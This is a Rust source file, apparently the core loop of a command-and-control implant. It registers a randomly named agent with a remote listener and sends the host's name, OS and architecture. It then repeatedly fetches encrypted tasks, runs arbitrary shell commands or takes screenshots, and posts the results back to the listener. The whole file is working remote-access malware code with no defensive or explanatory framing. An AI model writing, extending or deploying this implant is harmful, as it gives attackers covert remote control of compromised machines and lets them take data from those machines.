use std::{
    io::{self, Write},
    thread,
    time,
    process::Command
};

use crate::{
    core::agents::{AgentData, enc_agentdata},
    Config,
    core::tasks::{
        linux::shell::shell,
        screenshot::screenshot
    },
    crypto::aesgcm::{decode_decrypt, encrypt_encode},
    utils::random::random_name, config::listener,
};

pub async fn run(config: Config) -> Result<(), std::io::Error> {
    let sleep = time::Duration::from_secs(config.sleep);

    // Get agent into for registration
    let agent_name =  random_name("agent".to_owned());
    let hostname = match Command::new("hostname").output() {
        Ok(h) => {
            String::from_utf8(h.stdout).unwrap().trim().to_string()
        },
        _ => String::from("unknown"),
    };
    let os = std::env::consts::OS.to_string();
    let arch = std::env::consts::ARCH.to_string();
    let listener_url = format!(
        "{}://{}:{}/",
        config.listener.proto.to_string(),
        config.listener.host.to_string(),
        config.listener.port.to_owned(),
    );

    let mut ra = AgentData::new(
        agent_name,
        hostname,
        os,
        arch,
        listener_url.to_string(),
        config.key.to_string(),
        config.nonce.to_string(),
    );
    let ra_enc = enc_agentdata(ra.clone());

    // Initialize client
    let mut client = reqwest::Client::new();

    // Agent registration process
    let mut registered = false;
    while !registered {
        thread::sleep(sleep);
    
        // Register agent
        let response = match client
            .post(format!("{}{}", listener_url.to_string(), "r"))
            .json(&ra_enc)
            .send()
            .await
        {
            Ok(resp) => {
                registered = true;
                let resp = resp.text().await.unwrap();
              
                String::from_utf8(
                    decode_decrypt(
                        resp.as_bytes(),
                        config.key.as_bytes(),
                        config.nonce.as_bytes()
                    )).unwrap()
            },
            Err(_) => continue,
        };
        // println!("{}", response);
    }

    loop {
        // TODO: Implement graceful shutdown

        thread::sleep(sleep);

        // Get task
        let task = match client
            .post(format!("{}{}", listener_url.to_string(), "t/a"))
            .json(&ra_enc)
            .send()
            .await
        {
            Ok(resp) => {
                let resp = resp.text().await.unwrap();

                String::from_utf8(
                    decode_decrypt(
                        resp.as_bytes(),
                        config.key.as_bytes(),
                        config.nonce.as_bytes()
                    )).unwrap()
            },
            Err(e) => {
                // println!("Error fetching /t/a: {:?}", e);
                continue;
            }
        };

        // println!("Task: {task}");

        // Execute task
        let task_args = match shellwords::split(&task) {
            Ok(args) => args,
            Err(_) => continue,
        };

        if task_args.len() == 0 {
            continue;
        }

        match task_args[0].as_str() {
            "screenshot" => {
                match screenshot().await {
                    Ok(result) => {
                        ra.task_result = Some(result);
                    }
                    Err(e) => {
                        ra.task_result = Some(e.to_string().as_bytes().to_vec());
                    }
                }
                let ra_enc = enc_agentdata(ra.clone());
                client
                    .post(format!("{}{}", listener_url.to_string(), "t/r"))
                    .json(&ra_enc)
                    .send()
                    .await;
            }
            "shell" => {
                match shell(task_args[1..].join(" ").to_string()).await {
                    Ok(result) => {
                        ra.task_result = Some(result);
                    }
                    Err(e) => {
                        ra.task_result = Some(e.to_string().as_bytes().to_vec());
                    }
                }
                let ra_enc = enc_agentdata(ra.clone());
                client
                    .post(format!("{}{}", listener_url.to_string(), "t/r"))
                    .json(&ra_enc)
                    .send()
                    .await;
            }
            _ => {
                continue;
            }
        }
    }
    
    Ok(())
}